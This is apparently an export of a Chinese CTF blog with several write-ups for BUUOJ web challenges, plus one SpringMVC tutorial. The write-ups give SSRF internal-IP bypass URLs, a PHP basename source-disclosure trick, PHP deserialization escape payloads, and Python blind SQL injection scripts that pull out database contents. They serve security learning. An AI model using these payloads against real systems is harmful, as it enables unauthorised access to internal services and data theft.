web进阶]Python里的SSRF知识点： 关于SSRF，其实我也懂得不多..这道题题目给出提示让我们访问 8000 端口和 url path /api/internal/secret 这里是看过P牛的文章.. 1leavesongs.com&#x2F;PYTHON&#x2F;defend-ssrf-vulnerable-in-python.html 所以我们想要绕过只需要构造： 1http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.233.233.233:8000&#x2F;api&#x2F;internal&#x2F;secret 除此之外，在linux当中0.0.0.0等效于127.0.0.1 故我们其实也可以构造： 1http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;api&#x2F;internal&#x2F;secret 还有： 利用八进制IP地址绕过 利用十六进制IP地址绕过 利用十进制的IP地址绕过 利用IP地址的省略写法绕过 1四种写法（5个例子）：012.0.0.1 、 0xa.0.0.1 、 167772161 、 10.1 、 0xA000001 实际上都请求的是10.0.0.1，但他们一个都匹配不上上述正则表达式。 这里还提供一些ssrf的思路，比如： 1http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误 还有这么一个[xip服务] http://xip.io 暂且思考到这里： [第二章 web进阶]SSRF Training呃，就很奇怪？这道题的时候，index.php服务下的容器，可以直接127.0.0.1/flag.php就冲过去了 但是还有个challenge.php,这个要难。给出源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phphighlight_file(__FILE__);function check_inner_ip($url)&#123; $match_result=preg_match(&#x27;/^(http|https)?:\\/\\/.*(\\/)?.*$/&#x27;,$url); if (!$match_result) &#123; die(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die(&#x27;url fomat error&#x27;); return false; &#125; $hostname=$url_parse[&#x27;host&#x27;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123; if (check_inner_ip($url)) &#123; echo $url.&#x27; is inner ip&#x27;; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info[&#x27;redirect_url&#x27;]) &#123; safe_request_url($result_info[&#x27;redirect_url&#x27;]); &#125; curl_close($ch); var_dump($output); &#125;&#125;$url = $_GET[&#x27;url&#x27;];if(!empty($url))&#123; safe_request_url($url);&#125;?&gt; 主要trick在于parse_url和curl的解析会出现差异，当我们构造url为： 1http:&#x2F;&#x2F;a@127.0.0.1:80@baidu.com parse_url会解析后者，拿到手上的就是http://baidu.com,而curl实际上发送出去的请求为127.0.0.1:80 注意一些，如果你需要访问某个页面，你需要添加的payload应该是： 1?url=http://a@127.0.0.1:80@hacktest.com/flag.php","categories":[],"tags":[]},{"title":"RoacCTFOnlineProxy","slug":"RoacCTFOnlineProxy","date":"2020-11-26T03:12:30.000Z","updated":"2020-11-26T07:57:01.936Z","comments":true,"path":"2020/11/26/RoacCTFOnlineProxy/","link":"","permalink":"http://example.com/2020/11/26/RoacCTFOnlineProxy/","excerpt":"","text":"","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"Zer0pts2020","slug":"Zer0pts2020","date":"2020-11-24T04:36:59.000Z","updated":"2020-12-02T08:19:04.672Z","comments":true,"path":"2020/11/24/Zer0pts2020/","link":"","permalink":"http://example.com/2020/11/24/Zer0pts2020/","excerpt":"","text":"Can you guess it?一开始放源码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;/h1&gt; &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt; &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 虽然这里的猜测成功之后你可以拿到flag，但是很明显这里的函数并没有漏洞，用的函数没有什么问题，那么就转换思路看上面的 highlight_file，因为这里的参数我们也可以控制，介绍一下 1$_SERVER[&#x27;PHP_SELF&#x27;] 该参数会返回我们的URL的路径，如图所示： 我们再用basename套上去 这样就可以拿到最后一部分了，但是basename有一个问题： 官网是有提示的，我们需要单独的setloale来进行操作，因为ascii中有这么一段介绍： 123在英语中，用128个符号编码便可以表示所有，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用 ASCII 码表示。于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使用的编码体系，可以表示最多256个符号 [5] 。但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0--127表示的符号是一样的，不一样的只是128--255的这一段 [5] 。至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。比如，简体中文常见的编码方式是 GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示 256 x 256 = 65536 个符号 [5] 。 也就是说，一旦我们的ascii位数大于128，就会出现歧义的情况，而汉字默认使用的是GBK编码，如果我们输出的数大于128，basename因为无法正确的解析，就会忽略这 一段，向前查找。 那我们的思路就很清楚了 1http:&#x2F;&#x2F;3a053ba1-1ae6-4030-8c67-3cacb6336ad7.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;%81?source 得到flag phpNantokaAdminMusicBlog这里主要是用到了一个trick，关于HTML的一个细节。当HTML出现&lt;a/xxx&gt;的情况下，则会默认只解析前半部分，而不会解析后面的part，具体例子如下： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;基础柱状图&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a &gt; 123123123123&lt;/a&gt; &lt;a/bcde&gt;123&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; 但在解析种，依然会将后者解析变成a标签。 回到题目来说，只需要我们通过该特质+href即可完成跨域绕过 详细文章： 123https:&#x2F;&#x2F;guokeya.github.io&#x2F;post&#x2F;rFsNvBC3x&#x2F;https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;78814","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"ZJCTF,就这？","slug":"ZJCTF-就这？","date":"2020-11-20T13:58:31.000Z","updated":"2020-11-20T14:00:59.717Z","comments":true,"path":"2020/11/20/ZJCTF-就这？/","link":"","permalink":"http://example.com/2020/11/20/ZJCTF-%E5%B0%B1%E8%BF%99%EF%BC%9F/","excerpt":"","text":"经典的代码审计！ 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 这里注意第一步，需要我们读取到的文件的内容当中含有I have a dream，然而文件当中压根没有这个内容，于是该怎么办呢？有两个办法，第一个是利用php://input,data://伪协议 如果你使用php://input,那么php就会去读取body当中的内容，你只需要在这构造I have a dream即可，除此之外还有的就是利用data://伪协议， 还有远程文件包含","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"反序列化逃逸","slug":"反序列化逃逸","date":"2020-11-20T12:02:23.000Z","updated":"2020-12-10T02:44:45.789Z","comments":true,"path":"2020/11/20/反序列化逃逸/","link":"","permalink":"http://example.com/2020/11/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/","excerpt":"","text":"也算是多做做总结吧 变长从网上看来的那么一段代码： 12345678910111213141516&lt;?phpfunction filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123; public $name=&#x27;aaaa&#x27;; public $pass=&#x27;123456&#x27;;&#125;$AA=new A();$res=filter(serialize($AA));echo $res;echo &quot;&lt;br&gt;&quot;;$c=unserialize($res);echo $c-&gt;pass;?&gt; 我们需要做到的是，如何修改$pass的值？ 首先当我们序列化一段A的的话得到的结果如下： 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; 并且我们注意到它会把bb变成ccc，当他序列化的时候，已经完成了，但是经过过滤之后它的字符串会变长，经历的是这么一个过程: 同时，反序列化还有这么一个特点，一旦读取到&#125;，他就会停止，不会再读取后面的内容，这样的话就很好解释了，我们构造payload如下： 成功修改了结果！ 那么如果是变短的情况下呢？ 长短的区别：和前面变长的原理是不一样的，在反序列化逃逸变长的情况下，你需要做的是拼接自己后面需要写的东西，所以你所需要补充的长度=你payload的长度，并且你是写到末尾出现&#125; 为止，以此来使得后面的字符串丧失作用！！！！！！，也就是说如果是变短的字符串逃逸，你需要能够控制两个变量！ 变短：而变短则截然不同，如果你需要变短，你要做的是吃掉你想要修改的部分的前面的part的全部 我们一样的先看正常的情况下是如何进行序列化的 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;dasasdasd&quot;;s:4:&quot;pass&quot;;s:5:&quot;asdas&quot;;&#125; 如果我们想要操作pass密码部分（控制后面的18是为了控制长度）的话，我们要吃掉的是 1&quot;;s:4:&quot;pass&quot;;s:18:&quot; 那就很简单了，我们算一算这段的长度就好了！！！！！算出来是19，那我们写38个b，拼出来剩余19个，之后呢，我们去复写前面的那一段的内容就好了！ 12345O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;&#125;比如是这样哈，我们如果写19个bb，过滤之后剩下这些，这样的话到pass前面的部分都无了实际上进入的也就剩下O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc[中间的没了]&quot;;&#125;那假设我们的pass写成:&quot;;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;,再重新拼接之后就变变成了！O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;&quot;;&#125;这样的话就又正常了！！！ 过滤之后只剩下： 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:4:&quot;asds&quot;;&#125;&quot;;&#125; 一些魔术方法： 1234567891011__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发,返回值需要为字符串__invoke() //当脚本尝试将对象调用为函数时触发","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"2019安询杯easyseailize","slug":"2019安询杯easyseailize","date":"2020-11-20T09:19:39.000Z","updated":"2020-11-20T13:33:52.945Z","comments":true,"path":"2020/11/20/2019安询杯easyseailize/","link":"","permalink":"http://example.com/2020/11/20/2019%E5%AE%89%E8%AF%A2%E6%9D%AFeasyseailize/","excerpt":"","text":"1.考点反序列化，变量覆盖，代码审计 2出发思路这道题目开局就放出来了源码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);echo $_SESSION[&quot;user&quot;];if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 先看最下面的，让你去phpinfo下面看，其实能找到一个文件： 再上下查找，我们还可以看见一个file_get_contents函数，那么我们的目标就很明确 控制img变量 向上看，那么就是控制$serialize_info 继续向上，就是控制$_SESSION 那我们的目标就很明确了，就是尝试控制$_SESSION的值，进行反序列化的那么一个操作，但是这里我们能控制的参数一个也没有，好在题目给出了一个利用点 利用点extract1extract($_POST); 该函数可以允许动态的变量，PHP中使用它的原意是想要令程序员可以程序中动态的调整常量，但是如果允许用户来调用的话就会出现变量覆盖的问题， 利用方式为我们想要修改的地方，如果是允许用户自定义的修改$_POST的内容，而我们想要修改session当中的值的时候，只需要 1_SESSION[user]=admin 如果想要修改get当中的参数实际上也是可以的 1_GET[admin]=123 修改部分代码如下： 例子如下： 可以看见我们的session为guest，利用extract函数我们就可以进行覆盖了： 反序列化逃逸12345function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125; 查看这段代码，乍一看好像是对我们想要输出的东西进行了相当严格的过滤，但是它仅仅是将我们输入的值替换为空，而不是die掉程序，结合反序列化的逃逸，我们就可以轻松的输出我们需要的内容 首先需要明白这道题目到底做了什么，假设我们什么参数也不传入，我们看见的字符串如下： 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 正常来说，我们是不可以控制这里面的值的，但是通过变量覆盖我们就可以控制其中的值了，但是又恰恰因为是变量覆盖的原因，我们如果单纯的写入function会因为前面已经有function了而无法写入，此时我们需要做的就是把前面的东西吃掉自己写入！这样就可以了！！！！！！！！！！！ 而我们可以控制的user当中的guest，此时我们需要吃掉的字符串键位 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:4:&quot;gura&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 1_SESSION[user]=flagflagflagflagflagflagflag&amp;_SESSION[function]=1bbbb&quot;;s:8:&quot;function&quot;;s:5:&quot;ysllz&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 读到了文件，成功，","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"SpringMVC","slug":"SpringMVC","date":"2020-11-19T12:52:05.000Z","updated":"2020-11-19T13:17:53.261Z","comments":true,"path":"2020/11/19/SpringMVC/","link":"","permalink":"http://example.com/2020/11/19/SpringMVC/","excerpt":"","text":"注入了一天真的整的人都头晕眼花的，学一下开发放松一下 SpringMVC-01我们首先第一步先复习Servlet和tomcat 我们老样子，三层架构，然后导入包什么的 类的组织： 注意请创建MAVEN项目 之后是导包： 1234567891011121314151617181920212223242526272829303132333435&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-api --&gt; &lt;dependency&gt; &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt; &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt; &lt;version&gt;5.7.0&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;5.2.10.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet.jsp-api&lt;/artifactId&gt; &lt;version&gt;2.3.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 再之后是写代码： HelloServlet： 123456789101112131415161718192021222324252627282930package com.gura.servlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class HelloServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;// 获取前端参数 String method =req.getParameter(&quot;method&quot;); if (method.equals(&quot;add&quot;))&#123; req.getSession().setAttribute(&quot;msg&quot;,&quot;执行了添加方法&quot;); &#125; if (method.equals(&quot;delete&quot;))&#123; req.getSession().setAttribute(&quot;msg&quot;,&quot;执行了delte方法&quot;); &#125; //调用业务// 视图转发或者重定向 req.getRequestDispatcher(&quot;/WEB-INF/jsp/test.jsp&quot;).forward(req,resp); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req,resp); &#125;&#125; test.jsp: 12345678910111213141516&lt;%-- Created by IntelliJ IDEA. User: 75620 Date: 2020/11/19 Time: 20:46 To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;$&#123;msg&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; web.xml: 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt; &lt;servlet&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;servlet-class&gt;com.gura.servlet.HelloServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;session-config&gt; &lt;session-timeout&gt;15&lt;/session-timeout&gt; &lt;/session-config&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; 这里实现了一次对接口的处理的转发 测试代码成功","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"极客大挑战FinalSql","slug":"极客大挑战FinalSql","date":"2020-11-19T08:40:54.000Z","updated":"2020-11-19T11:41:09.490Z","comments":true,"path":"2020/11/19/极客大挑战FinalSql/","link":"","permalink":"http://example.com/2020/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98FinalSql/","excerpt":"","text":"1.考点盲注,学习到了新的姿势，当我们的if被过滤的时候，可以通过^的方式来操作 ?id=1=(表达式)=1 ?id=1^(表达式)^1 ^ 在mysql当中代表的是位异或的意思，呃？百度了一下大概明白了一些 两个数相同得0，不同得1；那我们进一步拓展思路，也就是说两个表达式相同的时候就会返回1，不同的时候就会返回0 拓展思路之后可以得到如下结果： 感觉还是用等号比较好理解啊 当两个=号夹在一起的时候 条件成立的时候就返回前面的判断结果，不成立的话就返回全部的结果了。 于是构造注入语句： 1http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(database(),1,1))&gt;102)&#x3D;1 得到数据库的名字：geek 接下来注入表名： 1http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)&#x3D;database()),1,1))&gt;102)&#x3D;1 11&#x3D;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),1,1))&gt;1)&#x3D;1 得到表名： 1F1naI1y,Flaaaaag 注入字段名： id,username,password flag在F1naI1y里面 最终exp： 1234567891011121314151617181920212223242526import requests, string, sysurl = &quot;http://7e5cde2c-f8e0-4059-a2e2-6121476516cc.node3.buuoj.cn/search.php&quot;# data = &quot;id=if(ascii( substr( database() ,1,1) )&gt;100,1,2)#&quot;# stringlist = string.digits + string.ascii_lettersflag = &quot;&quot;for i in range(1, 999): # for j in stringlist: for j in range(40, 126): # sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j) # sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j) # sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format( # i, j) sql = &quot;1=(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j) data = &#123;&quot;id&quot;: sql&#125; res = requests.get(url=url, params=data) # print(data) if &quot;ingyingying~ Not this as wel&quot; in res.text: print(j) flag += chr(j) print(flag) break if j == 125: sys.exit() 得到答案：","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"GYCTF2020Ezsqli","slug":"GYCTF2020Ezsqli","date":"2020-11-19T04:38:48.000Z","updated":"2020-12-03T05:42:55.989Z","comments":true,"path":"2020/11/19/GYCTF2020Ezsqli/","link":"","permalink":"http://example.com/2020/11/19/GYCTF2020Ezsqli/","excerpt":"","text":"考点盲注，无列名注入。一样的尝试构造注入语句之后： 这里利用了网站的特性，当条件成立的时候返回NU1l,失败的时候，就是V&amp;N 1234567891011121314151617181920import requests, stringurl = &quot;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&quot;# data = &quot;id=if(ascii( substr( database() ,1,1) )&gt;100,1,2)#&quot;# stringlist = string.digits + string.ascii_lettersflag = &quot;&quot;for i in range(1, 999): # for j in stringlist: for j in range(40, 126): sql = &quot;if(ascii( substr( database() ,&#123;&#125;,1) )&gt;&#123;&#125;,1,2)#&quot;.format(i, j) data = &#123;&quot;id&quot;: sql&#125; res = requests.post(url=url, data=data) # print(data) if &quot;V&amp;N&quot; in res.text: print(j) flag += chr(j) print(flag) break 注入得到表名： 1givf_grasdpa_pa_pa_pa 之后进一步却很难了，因为我们不知道该怎么查询东西，因为information_schmea被过滤掉了，故只能考虑其他注入，分别尝试对innob和sys库进行注入，挨个尝试： 1234mysql.innodb_table_statssys.schema_auto_increment_columns sys.schema_table_statistics_with_buffersys.x$schema_flattened_keys 构造语句： 1select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database() 注入表： 1sql =&quot;if(ascii( substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database() ),&#123;&#125;,1) )&gt;&#123;&#125;,1,2)#&quot;.format(i, j) # 数据表 得到结果: 1users233333333333333,f1ag_1s_h3r3_hhhhh 但是之后我们因为被过滤了or无法获取自动的名字，只能进行无列名注入的操作了 首先学习了一波师傅的思路： 利用ascii位的偏移，在本地进行尝试 这里需要注意的是 如果select b &gt;select a，如果select b &gt; select a返回的0 之后还可以进一步的去构造拼接： 那么也就是说我们构造出flag之后一步一步的位移推算即可 这里贴上师傅的脚本： 12345678910111213141516171819import requestsurl = &#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;def add(flag): res = &#x27;&#x27; res += flag return resflag = &#x27;&#x27;for i in range(1,200): for char in range(32, 128): hexchar = add(flag + chr(char)) payload = &#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(hexchar) #print(payload) data = &#123;&#x27;id&#x27;:payload&#125; r = requests.post(url=url, data=data) text = r.text if &#x27;Nu1L&#x27; in r.text: flag += chr(char-1) print(flag) break 除此之外还有二分法： 123456789101112131415161718192021222324252627282930import requestsurl=&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;#give_grandpa_pa_pa_papayload_flag=&#x27;1^((1,\\&#x27;&#123;&#125;\\&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;flag =&#x27;&#x27;for i in range(1,100): low = 32 high = 132 mid = (low + high) //2 while(low &lt; high): k = flag+chr(mid) payload = payload_flag.format(k) data=&#123;&quot;id&quot;: payload&#125; print(payload) r = requests.post(url=url,data=data) if &#x27;Nu1L&#x27; in r.text: low = mid+1 else: high = mid mid = (low+high) //2 if mid ==33: break flag +=chr(mid-1) print(flag.lower())#因为出来的flag是大写，这边全部转为小写 print(flag.lower()) 记一下报错注入1admin&#x27; and 